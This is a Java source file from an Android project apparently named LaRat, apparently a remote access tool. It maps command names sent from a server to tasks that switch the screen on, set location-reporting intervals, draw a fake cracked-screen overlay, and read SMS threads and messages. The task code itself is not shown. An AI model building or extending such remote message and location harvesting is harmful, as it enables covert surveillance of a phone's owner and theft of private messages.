package com.c4wd.command;

import android.content.Context;
import android.os.AsyncTask;
import android.os.PowerManager;
import android.widget.Toast;

import com.c4wd.larat.LaRatLocationManager;

import java.util.HashMap;

/**
 * Created by cory on 10/4/15.
 */
public class Command {

    public static HashMap<String, AsyncTask> commandList;

    public static AsyncTask getTask(String id) {
        return commandList.get(id);
    }

    public static void initCommands() {
        if (Command.commandList == null) {
            Command.commandList = new HashMap<String, AsyncTask>();

            //Adding commands is simple
            //commandList.put("String of command that is sent from the server", new (Task class)());

            commandList.put("ScreenOn", new GenericTasks.ScreenOnTask());
            commandList.put("SetLocationInterval", new GenericTasks.SetLocationIntervalTask());
            commandList.put("Toast", new GenericTasks.ToastTask());
            //drawing tasks
            commandList.put("OpenGL", new DrawingTasks.OpenGLViewTask());
            commandList.put("Pong", new DrawingTasks.PongTask());
            commandList.put("ScreenCrack", new DrawingTasks.CrackScreenTask());
            //sms tasks
            commandList.put("CacheThread", new SMSCommands.CacheThreadIdTask());
            commandList.put("GetMessages", new SMSCommands.GetMessagesTask());
            commandList.put("GetThreads", new SMSCommands.GetThreadsTask());
        }
    }
}
